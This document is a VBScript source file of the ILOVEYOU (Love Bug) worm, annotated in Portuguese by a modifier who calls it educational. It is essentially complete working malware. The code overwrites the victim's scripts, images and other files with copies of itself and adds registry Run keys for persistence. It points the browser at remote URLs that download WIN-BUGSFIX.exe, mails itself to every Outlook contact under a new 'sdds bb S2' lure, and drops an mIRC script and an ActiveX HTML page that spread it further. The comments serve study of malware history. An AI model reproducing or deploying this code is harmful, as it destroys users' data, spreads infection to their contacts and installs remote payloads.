rem .: Worm modificado por Ewerton Bramos para fins educativos apenas :.
rem :: Não execute este script fora de uma máquina virtual!           ::

rem - O worm original, conhecido popularmente como ILOVEYOU ou Love Bug,
rem - foi criado por Onel de Guzman e detectado pela primeira vez no ano
rem - de 2000 nos sistemas Windows 2000, que sofriam de diversas vulnerabilidades
rem - que permitiam a execução de scripts VBS diretamente de um cliente de email
rem - e que escondiam a extensão destes arquivos do usuário final.

rem - Criado como trabalho de conclusão de curso da faculdade de computação de
rem - Guzman, que posteriormente a largou após a rejeição do seu TCC, o worm
rem - não é de todo muito competente, possuindo algumas falhas e sendo feito
rem - em uma linguagem de programação não muito comum para ataques de baixo nível.
rem - Contudo, é inegável o grande impacto que as linhas de código que se seguem
rem - causaram ao redor do mundo, pois nem mesmo Guzman imaginou que seu worm
rem - causaria tanto estrago para fora das redondezas das filipinas.

rem - restante do arquivo que se segue é o worm original que se infectou em
rem - computadores Windows no ano de 2000, sendo sutilmente modificado com adição
rem - de comentários explicativos e formatação e organização de código.
rem - O worm original pode ser encontrado em: https://cexx.org/loveletter.htm

rem *****************************************************************************

rem  barok -loveletter(vbe) <i hate go to school>
rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next

rem Iniciando variáveis globais a serem utilizadas pelas subrotinas e funções.
Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0

rem Abrindo o arquivo atual e definindo "vbscopy", que pode ser utilizado para
rem  ler o seu próprio conteúdo. Utilizado para se autoreplicar em outros arquivos.
rem Esta variável é utilizada, por exemplo, na subrotina injectfiles, que infecta
rem  outros arquivos do sistema com o próprio malware.
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname, 1)
vbscopy = file.ReadAll

rem Subrotina principal de todo o programa, o main
main()
Sub main()
  On Error Resume Next
  Dim wscr, rr

  rem Criando um shell que será utilizado para ler os registros.
  Set wscr = CreateObject("WScript.Shell")

  rem Recuperando a chave de registro que indica o timeout de scripting do sistema Windows.
  rem Se o timeout for maior que zero, o timeout será anulado, para que assim,
  rem  o worm execute sem timeout e de forma mais veloz e rápida.
  rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
  If (rr >= 1) Then
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  End If

  rem Após buscar por pastas específicas do sistema, o worm se replica
  rem  em mais 3 arquivos .vbs escondidos pelo sistema, disfarçados de DLLs
  rem  legítimas, além é claro de produzir o arquivo que será enviado via email.
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  Set c = fso.GetFile(WScript.ScriptFullName)

  c.Copy(dirsystem & "\MSKernel32 (OBVIAMENTE o kernel do sistema, não me apague!).vbs")
  c.Copy(dirwin & "\Win32DLL (OBVIAMENTE uma DLL do sistema, não me apague!).vbs")
  c.Copy(dirsystem & "\SDDS-BB-S2.txt.vbs")

  rem Após o worm se replicar, o programa ainda vai executar mais 4 subrotinas:
  rem  regruns:        os 3 arquivos criados se iniciam sozinhos e o "WIN-BUGSFIX.exe" é baixado.
  rem  html:           cria uma página HTML que é aberta sempre que o Windows é iniciado.
  rem  spreadtoemail:  envia o worm para os contatos do usuário através do email.
  rem  listadriv:      infecta outros arquivos pessoais, como imagens e músicas.

  regruns()
  html()
  spreadtoemail()
  listadriv()
End Sub

rem Esta subrotina cria e edita valores de registros, referenciada
rem  principalmente dentro da subrotina regruns
Sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey, regvalue
End Sub

rem Chamando regcreate várias vezes, esta subrotina modifica vários
rem  registros especiais de sistema.
Sub regruns()
  On Error Resume Next
  Dim num, downread

  rem Primeiramente, estes registros adicionam os arquivos que criamos anteriormente
  rem  a serem executados automaticamente na inicialização do sistema.
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32 (OBVIAMENTE o kernel do sistema, não me apague!).vbs"
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL (OBVIAMENTE uma DLL do sistema, não me apague!).vbs"

  rem Buscando pela pasta do fatídico navegador Internet Explorer.
  rem Se o worm não conseguir encontrar o Internet Explorer, então a pasta de download
  rem  vai ser simplesmente a raiz do drive C:
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
  If (downread = "") Then
    downread = "c:\"
  End If

  rem O worm verifica se o "WinFAT32.exe" já foi baixado e se encontra nos arquivos do sistema.
  If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then

    rem Gera um número aleatório de 1 a 4, cada um associado a um link de download diferente
    rem  para o malware WIN-BUGSFIX.exe, aparentemente.
    Randomize
    num = Int((4 * Rnd) + 1)
    If num = 1 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    ElseIf num = 2 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    ElseIf num = 3 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    ElseIf num = 4 Then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    End If
  End If

  rem O worm verifica se o "WIN-BUGSFIX.exe" foi baixado dentro da pasta de download,
  rem  e então, o malware é movido para uma pasta que indica programas a serem executados
  rem  automaticamente após a inicialização e a página utilizada para baixar o malware é fechada.
  If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\StartPage", "about:blank"
  End If
End Sub

rem Subrotina para listar pastas dentro dos drives (C:, D: etc.),
rem  chamando assim folderlist.
Sub listadriv()
  On Error Resume Next
  Dim d, dc, s

  Set dc = fso.Drives

  For Each d In dc
    If (d.DriveType = 2) Or (d.DriveType = 3) Then
      folderlist(d.path & "\")
    End If
  Next

  listadriv = s
End Sub

rem Esta subrotina busca por arquivos dentro de pastas, para que assim,
rem  o worm contamine estes arquivos pela subrotina infectfiles
Sub folderlist(folderspec)
  On Error Resume Next
  Dim f, f1, sf

  Set f = fso.GetFolder(folderspec)
  Set sf = f.SubFolders

  rem para cada subpasta dentro das pastas, de forma recursiva, o worm
  rem  infecta os arquivos dentro de todas as pastas que encontrar.
  For Each f1 In sf
    infectfiles(f1.path)
    folderlist(f1.path)
  Next
End Sub

rem Esta subrotina é responsável por infectar outros arquivos pessoais
rem  do usuário, como imagens, músicas e vídeos, com o próprio worm,
rem  além de criar outro malware mIRC.
Sub infectfiles(folderspec)
  On Error Resume Next
  Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3

  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files

  rem O worm vai buscar por todos os arquivos encontrados na pasta
  rem  encontrada pela subrotina folderlist.
  For Each f1 In fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)

    rem O worm é duplicado para todo arquivo .vbs ou .vbe.
    rem O arquivo é aberto, o conteúdo é modificado e o arquivo é fechado.
    If (ext = "vbs") Or (ext = "vbe") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)
      ap.write vbscopy
      ap.close

    rem O worm faz a mesma coisa para arquivos .js, .css etc.
    rem Contudo, também é necessário adicionar a extensão .vbs a estes arquivos
    rem  para que o worm consiga se replicar e ser executado.
    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css")
        Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)
      ap.write vbscopy
      ap.close

      bname = fso.GetBaseName(f1.path)
      Set cop = fso.GetFile(f1.path)
      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)

    rem O worm se replica em imagens .jpg, mas por algum motivo,
    rem  o worm também duplica as imagens? Ao que parece, não era possível
    rem  simplesmente renomear o arquivo para adicionar a extensão .vbs,
    rem  então o autor do worm preferiu por fazer uma duplicata, eu acho.
    ElseIf (ext = "jpg") Or (ext = "jpeg") Then
      Set ap = fso.OpenTextFile(f1.path, 2, true)
      ap.write vbscopy
      ap.close

      Set cop = fso.GetFile(f1.path)
      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    
    rem Este caso é o mais intrigante. Creio que a ideia era duplicar
    rem  o worm em arquivos .mp3 e então escondê-los ao adicionar o atributo "2",
    rem  mas alterar o conteúdo da música não funciona e elas ficam intactas.
    ElseIf (ext = "mp3") Or (ext = "mp2") Then
      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
      mp3.write vbscopy
      mp3.close

      Set att = fso.GetFile(f1.path)
      att.attributes = att.attributes + 2
    End If

    rem Verifica se a pasta já foi infectada, senão, o worm continua se espalhando.
    If (eq <> folderspec) Then
      rem O worm procura por scripts mIRC para alterar seu conteúdo.
      If (s = "mirc32.exe")
        Or (s = "mlink32.exe")
        Or (s = "mirc.ini")
        Or (s = "script.ini")
        Or (s = "mirc.hlp")
      Then
        rem O script mIRC a seguir verifica o usuário que está logado e envia um
        rem  comando DDC para enviar uma mensagem para um link para a página
        rem  SDDS-BB-S2.HTM, ou seja, uma página web do próprio vírus, criado
        rem  na subrotina html.

        Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Pu favô... n mexe naqui n... senao o mIRC vai corrompe,"
        scriptini.WriteLine "   Se o script corrompe, o WINDOWS vai pro beleleu. vlw flw."
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /If ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick" & dirsystem & "\SDDS-BB-S2.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close

        eq = folderspec
      End If
    End If
  Next
End Sub

rem Função utilizada para ler valores de registros.
Function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
End Function

rem Função utilizada para verificar se um arquivo existe.
Function fileexist(filespec)
  On Error Resume Next
  Dim msg

  If (fso.FileExists(filespec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Função utilizada para verificar se uma pasta existe.
Function folderexist(folderspec)
  On Error Resume Next
  Dim msg

  If (fso.GetFolderExists(folderspec)) Then
    msg = 0
  Else
    msg = 1
  End If

  fileexist = msg
End Function

rem Esta subrotina é a responsável por enviar emails aos contatos da vítima
rem  através de uma API usada pelo Outlook para se comunicar com o
rem  Microsoft Exchange Server: o Messaging Application Programming Interface (MAPI).
rem  Além de hospedar emails, o MAPI também contém calendários e lista de endereços.
Sub spreadtoemail()
  On Error Resume Next
  Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad

  rem Primeiro, é criado um shell para editar um registro, e então, é criado
  rem  uma instância do programa Outlook, para assim, acessar o MAPI e obter
  rem  os contatos e emails da vítima.
  Set regedit = CreateObject("WScript.Shell")
  Set out = WScript.CreateObject("Outlook.Application")
  Set mapi = out.GetNameSpace("MAPI")

  rem O programa faz um for loop para cada um dos endereços salvos do usuário.
  For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1

    rem Este registro serve para garantir que o worm só seja enviado uma única vez
    rem  para cada contato, evitando contatos duplicados.
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)

    If (regv = "") Then
      regv = 1
    End If

    If (int(a.AddressEntries.Count) > int(regv)) Then

      rem Para cada endereço, é feito outro for loop para encontrar emails associados:
      For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )

        rem Caso o contatinho ainda não tenha recebido o email, então a carta será
        rem  gerada e o worm .vbs será enviado em anexo.
        If (regad = "") Then
          Set male = out.CreateItem(0)

          male.Recipients.Add(malead)
          male.Subject = "sdds bb S2"
          male.Body = vbcrlf & "como vc ta? faz tanto tempo que a gnt n se ve. eu tenho umas coisas para te dizer."
          male.Attachments.Add(dirsystem & "\SDDS-BB-S2.TXT.vbs")
          male.Send

          rem Após o email ser enviado através do male.Send, vamos alterar o registro para que
          rem  o programa saiba que já enviamos o worm para este contato.
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        End If

        x = x + 1
      Next

      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    Else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
    End If
  Next

  Set out = Nothing
  Set mapi = Nothing
End Sub

rem Subrotina utilizada para gerar e criar o arquivo HTML SDDS-BB-S2.HTM.
Sub html
  On Error Resume Next
  Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6

  rem Criando o conteúdo HTML da página, contendo em si script JavaScript e Visual Basic Script
  rem  para se replicar através de um recurso chamado ActiveX. A página também detecta eventos
  rem  como keypress e onclick, para abrir mais janelas da mesma página como um popup.
  rem Ao que parece, o Visual Basic Script não permitia o uso das barras invertidas (/) e nem
  rem de aspas duplas em strings, então o autor do worm precisou dar um jeito de substituir os
  rem caracteres necessários para criar o documento HTML da forma apropriada.
  dta1 = "<html>"
    & vbcrlf & _ "<head>"
    & vbcrlf & _ "<title>SDDSBBS2 - HTML<?-?title>"
    & vbcrlf & _ "<meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@>"
    & vbcrlf & _ "<meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
    & vbcrlf & _ "<meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@>"
    & vbcrlf & _ "<?-?head>"
    & vbcrlf & _ "<body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ "
    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
    & vbcrlf & _ "<CENTER>"
    & vbcrlf & _ "<p>This HTML file need ActiveX Control<?-?p>"
    & vbcrlf & _ "<p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
    & vbcrlf & _ "<?-?CENTER>"
    & vbcrlf & _ "<MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
    & vbcrlf & _ "<?-?body>"
    & vbcrlf & _ "<?-?html>"
    & vbcrlf & _ "<script language=@-@JScript@-@>"
    & vbcrlf & _ "<!--?-??-?"
    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?script>"
    & vbcrlf & _ "<script language=@-@VBScript@-@>"
    & vbcrlf & _ "<!--"
    & vbcrlf & _ "on error resume next"
    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
    & vbcrlf & _ "aw=1"
    & vbcrlf & _ "code="

  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
    & vbcrlf & _ "wri.write code4"
    & vbcrlf & _ "wri.close"
    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
    & vbcrlf & _ "If (err.number=424) Then"
    & vbcrlf & _ "aw=0"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "If (aw=1) Then"
    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
    & vbcrlf & _ "window.close"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "End If"
    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
    & vbcrlf & _ "?-??-?-->"
    & vbcrlf & _ "<?-?SCRIPT>"

  rem Substituindo caracteres inválidos por caracteres ASCII válidos
  rem  para serem exibidos em um navegador web por um encoding apropriado.
  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")

  rem Abrindo um novo arquivo de FileSystemObject, para que o conteúdo
  rem  HTML seja injetado dentro do arquivo a ser criado.
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)

  lines = Split(c.ReadAll,vbcrlf)
  l1 = ubound(lines)

  rem Codifica todos os caracteres especiais do script HTML
  For n = 0 to ubound(lines)
    lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n) = replace(lines(n), "\", chr(37) + chr(45) + chr(37))

    If (l1 = n) Then
      lines(n) = chr(34) + lines(n) + chr(34)
    Else
      lines(n) = chr(34) + lines(n) + chr(34) & " & vbcrlf & _"
    End If
  Next

  rem Finalmente, o arquivo HTML é criado e todo o conteúdo acima é escrito.
  Set b = fso.CreateTextFile(dirsystem + "\SDDS-BB-S2.HTM")
  b.close
  Set d = fso.OpenTextFile(dirsystem + "\SDDS-BB-S2.HTM", 2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
End Sub
